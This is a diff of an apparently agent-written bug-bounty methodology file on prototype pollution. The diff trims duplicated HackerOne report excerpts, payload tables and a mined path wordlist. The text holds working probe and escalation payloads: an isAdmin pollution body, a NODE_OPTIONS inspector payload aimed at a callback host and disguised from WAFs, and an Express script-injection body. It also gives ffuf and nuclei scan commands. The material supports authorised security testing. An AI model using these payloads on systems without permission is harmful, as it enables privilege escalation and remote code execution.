@@ -4,13 +4,13 @@ description: "Use for __proto__/constructor.prototype injection in JSON bodies, 
 agent_created: true
 ---
 
-# Prototype Pollution — unified skill
+# Prototype Pollution — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 14 valid HackerOne reports (0 paid / 0%)
+## Corpus signal — 14 valid reports (0 paid / 0%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -22,66 +22,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | third-party data / paste / breach reuse | 1 |
 | file upload / filename / extension | 1 |
 | mass assignment / extra request fields | 1 |
-
-### Parameters observed in writeups
-
-`malicious_payload` (5), `merge` (4), `payload` (2), `test` (2), `deap` (1), `mergify` (1), `upmerge` (1), `tsdot` (1), `obj` (1)
-
-### Bypass primitives observed
-
-`bypass` (1), `bypassed` (1)
-
-### Impact language observed
-
-`remote code execution` (13), `rce` (4), `admin` (3), `sensitive information` (2)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [778414](https://hackerone.com/reports/778414) — [klona] Prototype pollution
-
-Node.js third-party modules · no bounty — still valid · critical
-
-I would like to report Prototype pollution in klona It allows adding arbitrary property to Prototype while deep cloning an object # Module **module name:** klona **version:** <1.1.1 **npm page:** ` ## Module Description A tiny (366B) and fast utility to "deep clone" Objects, Arrays, Dates, RegExps, and more! ## Module Stats 356 weekly downloads # Vulnerability ## Vulnerability Description See: ## Steps To Reproduce: Described here: Note: This vulnerability was reported directly to owner here on 10/01/2020. Fix published in v1.1.1 on 15/01/2020 # Wrap up - I contacted the maintainer to let them know: Y - I opened an issue in the related repository: Y > Hunter's comments and funny memes goes here {F690469} ## Impact Denial of Service and possible Remote code execution by overriding object's property methods like `toString`
-
-#### [245228](https://hackerone.com/reports/245228) — Object Injection in Woocommerce / Handle PDT Responses from PayPal
-
-Automattic · no bounty — still valid · medium
-
-At this moment prevention from object injection is in the following line of code: but the PHP native [unserialize]( function supports little `o` as option in it and it is a StdClass object. Due this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.
-
-#### [390860](https://hackerone.com/reports/390860) — Prototype Pollution Vulnerability in mpath Package
-
-Node.js third-party modules · no bounty — still valid · high
-
-I would like to report prototype pollution vulnerability in mpath. It allows an attacker to inject arbitrary properties on Object.prototype. # Module **module name:** mpath **version:** 0.4.1 **npm page:** ` ## Module Description {G,S}et javascript object values using MongoDB-like path notatio ## Module Stats 305,874 downloads in the last week # Vulnerability ## Vulnerability Description An attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones. ## Steps To Reproduce: ## Patch N/A validate property names before overwriting them and prevent write to certain paths. # Wrap up - I contacted the maintainer to let them know: [N - I opened an issue in the related repository: N ## Impact This may be an intended behaviour of this module, but it needs to be better documented. Moreover, to properly analyse the impact of this vulnerability one must look at the clients of this module, such as mongoose and see if attackers can realistically control the path value.
-
-#### [311333](https://hackerone.com/reports/311333) — Prototype pollution attack (deep-extend)
-
-Node.js third-party modules · no bounty — still valid · low
-
-As discussed in #309391, here's the separate report for each of the library. This one is the information for the deep-extend library. **Module:** [deep-extend]( **Summary:** Utilities function in all the listed modules can be tricked into modifying the prototype of "Object" when the attacker control part of the structure passed to these function. This can let an attacker add or modify existing property that will exist on all object. **Description:** ## Steps To Reproduce: The simplest test case to reproduce the issue is the following code snippet. In the code snippet, "malicious_payload" would come from an endpoint which accepts JSON data. > var merge = require('deep-extend'); > var malicious_payload = '{"\_\_proto\_\_":{"oops":"It works !"}}'; > > var a = {}; > console.log("Before : " + a.oops); > merge({}, JSON.parse(malicious_payload)); > console.log("After : " + a.oops); This shows that an attacker can add attributes to all existing object on the server. Additional attribute can be used to change the execution code flow or cause error on every subsequent request by replacing "toString" or "valueOf". ## Impact: This vulnerability is guaranteed to at least obtain denial of service as all the library allow the property "toString" and "valueOf" to be replaced by a "String". This breaks the express module and forces the server to either crash or return a 500 to every subsequent 
-
-#### [390857](https://hackerone.com/reports/390857) — Prototype Pollution Vulnerability in noble Package
-
-Node.js third-party modules · no bounty — still valid · high
-
-I would like to report prototype pollution vulnerability in noble. It allows attackers to pollute the Object.prototype object of an application running noble, possibly through Bluetooth. # Module **module name:** noble **version:** 1.9.1 **npm page:** ` ## Module Description A Node.js BLE (Bluetooth Low Energy) central module. Want to implement a peripheral? Checkout bleno Note: macOS / Mac OS X, Linux, FreeBSD and Windows are currently the only supported OSes. Other platforms may be developed later on. ## Module Stats 2,270 downloads in the last week # Vulnerability ## Vulnerability Description An attacker can inject arbitrary properties on Object.prototype using one of the methods exposed by this module. Moreover, there is strong evidence (parameter names) to believe that these values can be controlled remotely by the attacker, through Bluetooth. ## Steps To Reproduce: For now, I only have a local payload, but it seems to me that both the peripheralUuid and serviceUuids, expected by the onServicesDiscover are specified in the Bluetooth standard, thus it may come from another device advertising itself over Bluetooth. However, this scenario needs to be investigated further. ## Patch N/A validate the property name or initialize the target object using Object.create(null). # Wrap up - I contacted the maintainer to let them know: N - I opened an issue in the related repository: N 
-
-#### [778414](https://hackerone.com/reports/778414) — [klona] Prototype pollution
-
-Node.js third-party modules · no bounty — still valid · critical
-
-I would like to report Prototype pollution in klona It allows adding arbitrary property to Prototype while deep cloning an object # Module **module name:** klona **version:** <1.1.1 **npm page:** ` ## Module Description A tiny (366B) and fast utility to "deep clone" Objects, Arrays, Dates, RegExps, and more! ## Module Stats 356 weekly downloads # Vulnerability ## Vulnerability Description See: ## Steps To Reproduce: Described here: Note: This vulnerability was reported directly to owner here on 10/01/2020. Fix published in v1.1.1 on 15/01/2020 # Wrap up - I contacted the maintainer to let them know: Y - I opened an issue in the related repository: Y > Hunter's comments and funny memes goes here {F690469} ## Impact Denial of Service and possible Remote code execution by overriding object's property methods like `toString`
-
-#### [245228](https://hackerone.com/reports/245228) — Object Injection in Woocommerce / Handle PDT Responses from PayPal
-
-Automattic · no bounty — still valid · medium
-
-At this moment prevention from object injection is in the following line of code: but the PHP native [unserialize]( function supports little `o` as option in it and it is a StdClass object. Due this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.
-
-### Recurring approach patterns from real reports
-
-- 1× module stats weekly downloads vulnerability vulnerability description i tested the deepcopy and deepextend functions
 
 ## Corpus-backed method (this class)
 
@@ -108,18 +48,13 @@ At this moment prevention from object injection is in the following line of code
 - Prototype pollution -> property override -> auth bypass.
 - Client pollution -> DOM gadget -> XSS.
 
-### Probes
-
-- {"__proto__":{"x":1}}, constructor.prototype payloads, JSON body and query array syntax.
-
 ### Veteran tip
 
 Gadget discovery is the whole game — fingerprint the framework before spending time on payload variants.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -152,10 +87,7 @@ Start here. These are the highest-yield tests for this class.
 - Library fingerprints to grep JS bundles for: `_.merge`, `_.defaultsDeep`, `_.set`, `_.setWith`, `jQuery.extend(true,...)`, `lodash.merge`, `Object.assign`, `$.extend`, `merge` from `deepmerge`, `mergeWith`. Check versions: lodash < 4.17.5 (`merge`/`set`/`defaultsDeep`), CVE-2018-3721 / CVE-2019-10744 fixed in 4.17.11; some ≥4.17.12 builds still allow `constructor.prototype`.
 - Server-side sources are most often **JSON body merge endpoints**: address/profile update, preferences, settings, search filters, import/config upload. Look for `JSON.parse()` followed by a merge — `JSON.parse` creates `__proto__` as an *own* property, which a vulnerable merge then reinterprets as a setter.
 - DOM Invader (Burp built-in browser): enable Prototype pollution under Attack types, reload, use **Test** to verify the source, then **Scan for gadgets** and let it auto-generate an `alert()` PoC. It covers query string, hash, and web-message JSON automatically — far faster than reading minified bundles.
-- Third-party **gadget** hotspots from PortSwigger Research: Google Analytics `hitCallback` → `setTimeout`; Google Tag Manager `sequence` → `eval`, `event_callback` → `setTimeout`; Adobe DTM `cspNonce` and `bodyHiddenStyle` → `innerHTML`, `trackingServerSecure` → `script.src` (host controllable). A site can be vulnerable through a library it never wrote.
-
-### Signals and surfaces
-
+- Third-party **gadget** hotspots from PortSwigger Research: Google Analytics `hitCallback` → `setTimeout`; Google Tag Manager `sequence` → `eval`, `event_callback` → `setTimeout`; Adobe DTM `cspNonce` and `bodyHiddenStyle` → `innerHTML`, `trackingServerSecure` → `script.src` (host controllable). A site can be vulnerable through a library it never wrote.### Signals and surfaces
 ### Signal
 
 - Reports: **59** · paid: **2**
@@ -179,10 +111,7 @@ Start here. These are the highest-yield tests for this class.
 
 Parameters, endpoints, and fields that commonly carry this bug:
 
-`query string` `JSON body` `cookies` `config` `merge`
-
-### Techniques, payloads and bypasses
-
+`query string` `JSON body` `cookies` `config` `merge`### Techniques and bypasses
 ### Payloads & probes
 
 - `?__proto__[polluted]=yes` `?constructor[prototype][polluted]=yes`
@@ -309,10 +238,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - **Immutable-prototype generic probe**: assigning a primitive to `__proto__.__proto__` is a no-op, assigning an object throws a TypeError. Trigger the difference through library path traversal (Blitz-style `referentialEqualities: {"path": ["__proto__.targetKey"]}`) to detect pollution without a console.
 - **OAST escalation primitive** (Gareth Heyes): `{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"}}` → DNS callback if a Node sink such as `exec`/`fork` is reachable; the doubled quotes obfuscate the host from WAF scrapers. This is both a detector and an RCE path (devtools inspector).
 - Express XSS escalation: `{"__proto__":{"_body":true,"body":"<script>evil()</script>"}}` with `res.send(obj)` can flip the content-type to HTML and reflect the payload — destructive/persistent, so only use on lab or owned targets, or after confirming with a safe probe first.
-- `{"__proto__":{"ignoreQueryPrefix":true}}` and `allowDots` are quieter chain primitives for cache-poisoning / parameter-smuggling follow-ups.
-
-### Validation and proof
-
+- `{"__proto__":{"ignoreQueryPrefix":true}}` and `allowDots` are quieter chain primitives for cache-poisoning / parameter-smuggling follow-ups.### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -328,10 +254,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - For RCE/OAST claims, require an actual Collaborator/DNS interaction tied to a unique token, not a WAF that scrapes hostnames. The doubled-quote obfuscated payload reduces that false positive.
 - Third-party gadget findings: name the library and version and show the site loads it; Google has historically declined to fix GTM/GA gadgets, arguing it's the site's responsibility to avoid pollution sources — report to the site.
 - Avoid the classic false positive: `hasOwnProperty` behavior on `JSON.parse` objects differs from object literals. `{"__proto__":"x"}` being *reflected* is not pollution — it's just a JSON key. Use the persistence and framework-effect probes above.
-- Clean up lab state by restarting the Node process between experiments; on real targets, stop after one non-destructive confirmation and do not attempt to "un-pollute" by overwriting with junk values.
-
-### Escalation and related chains
-
+- Clean up lab state by restarting the Node process between experiments; on real targets, stop after one non-destructive confirmation and do not attempt to "un-pollute" by overwriting with junk values.### Escalation and related chains
 ### Escalation chains
 
 - Prototype pollution -> DOM XSS.
@@ -340,10 +263,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 ### Type Juggling -> PHP Object Injection -> SQL Injection Chain
 
 `#202774` · ExpressionEngine · $0 · n/a · 2017-02-07 · ▲40
-> Justin Kennedy identified a Type Juggling vulnerability in ExpressionEngine that allowed access to unserialize using user supplied data, ultimately achieving SQL Injection. The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/
-
-### Tools and wordlists
-
+> Justin Kennedy identified a Type Juggling vulnerability in ExpressionEngine that allowed access to unserialize using user supplied data, ultimately achieving SQL Injection. The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/### Tools
 ### Tools
 
 `Burp` · `DOM Invader` · `ppmap` · `browser console`
@@ -374,10 +294,7 @@ nuclei -u https://target -tags prototype-pollution \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Sources and related reading
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -415,10 +332,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class prot
 6. https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
 7. https://wstg.owasp.org/latest/11-Injection/21-Prototype_Pollution/
 8. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html
-9. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html
-
-### Additional notes
-
+9. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html### Additional notes
 ### Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
 
 `#998398` · Elastic · $0 · high · 2021-08-16 · ▲157
@@ -437,141 +351,8 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class prot
 ### Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)
 
 `#3560402` · Node.js · $0 · high · 2026-03-30 · ▲22
-> A flaw in Node.js HTTP request handling causes an uncaught TypeError when a request is received with a header named proto and the application accesses req.headersDistinct. When this occurs, dest[" proto "] resolves to Object.prototype rather than undefined, causing .push() to be called on a non-array.
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# Prototype Pollution & Client-Side Object Injection — HackerOne field guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- `?__proto__[polluted]=yes` `?constructor[prototype][polluted]=yes`
-
-- `{"__proto__":{"isAdmin":true}}`
-
-- `a[__proto__][x]=1` in qs/body-parser
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 15× | `__proto__` |
-
-| 4× | `{__proto__: {...}}` |
-
-| 4× | `$.extend` |
-
-| 3× | `{constructor: {prototype: {...}}}` |
-
-| 3× | `@firebase/util` |
-
-| 2× | `%%{init: { '__proto__': {'polluted': 'asdf'}} }%% / sequenceDiagram / Alice->>Bob: Hi Bob / Bob->>Alice: Hi Alice` |
-
-| 2× | `fix(misc) use safeJsonParse from js-utils` |
-
-| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |
-
-| 2× | `__proto__.polluted` |
-
-| 1× | `%%{init: {<JSON_OBJECT>}}%%` |
-
-| 1× | `\n${cnf.themeCSS}` |
-
-| 1× | `\n:root { --mermaid-font-family: ${cnf.fontFamily}}` |
-
-| 1× | `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}` |
-
-| 1× | `let expr = require('property-expr') / obj = {} / expr.setter('constructor.prototype.isAdmin')(obj,true) / console.log({}.isAdmin) // true` |
-
-| 1× | `dest["__proto__"]` |
-
-| 1× | `.push()` |
-
-| 1× | `ref: Cleanup BridgeChannelMessage (remove unnecessary type field).` |
-
-| 1× | `POST /auth/login / {"email":{"email":1},"password":"1234"}` |
-
-| 1× | `> console.table({a: 1, b: 1, c: 1}, ['__proto__']) / Uncaught TypeError: Cannot create property '0' on string '' / > Object.prototype / [Obj` |
-
-| 1× | `const keys = properties \\|\\| ObjectKeys(item); / for (const key of keys) { / + if (key === '__proto__') { / + continue / + } / if (map[key]` |
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_prototype-pollution.txt` | 52 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_prototype-pollution.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Scanner coverage is minimal; test merge/query parsers and confirm a downstream gadget.
-
-
-
-```sh
-
-nuclei -u https://target -tags prototype-pollution \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_prototype-pollution.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Companion: hunting / references/techniques.md
+> A flaw in Node.js HTTP request handling causes an uncaught TypeError when a request is received with a header named proto and the application accesses req.headersDistinct. When this occurs, dest[" proto "] resolves to Object.prototype rather than undefined, causing .push() to be called on a non-array.### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # Prototype Pollution & Client-Side Object Injection — HackerOne field guide — Technique reference
 
@@ -825,82 +606,13 @@ python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class protot
 
 python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class prototype-pollution --min-bounty 1000
 
-```
+```## Probes
 
-## Corpus wordlists (mined)
+- {"__proto__":{"x":1}}, constructor.prototype payloads, JSON body and query array syntax.
 
-### `params_prototype-pollution.txt`
+## Supporting data
 
-```text
-
-```
-
-### `paths_prototype-pollution.txt`
-
-```text
-/package/lodash
-/package/defaults-deep
-/.test(p
-/mermaid/diagrams-and-syntax-and-examples/directives.html
-/script&gt
-/package/property-expr
-/auth/login
-/data/definitions/1321.html
-/package/nested-property
-/package/i18next
-/overview/api
-/advisories/1479
-/busboy
-/package/fastify-multipart
-/package/dot-prop
-/package/merge
-/i/40r9dg
-/package/typeorm
-/package/jquery
-/vuln/SNYK-JS-LODASH-450202
-/package/klona
-/package/mpath
-/package/lutils-merge
-/package/json8-merge-patch
-/package/extend-merge
-/package/extend
-/package/noble
-/package/upmerge
-/package/deep-extend
-/package/utils-extend
-/package/just-extend
-/package/assign-deep
-/package/mixin-deep
-/package/hoek
-/advisories/1164
-/package/node.extend
-/package/merge-deep
-/package/smart-extend
-/package/mergify
-/package/deap
-/package/plain-object-merge
-/package/ts-dot-prop
-/package/merge-object
-/package/merge-options
-/package/merge-recursive
-/package/objtools
-/package/keyd
-/package/json-bigint
-/package/supermixer
-/package/cached-path-relative
-/package/@firebase/util
-/package/object-path-set
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-prototype-pollution`
-- `hunting` — `prototype-pollution`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
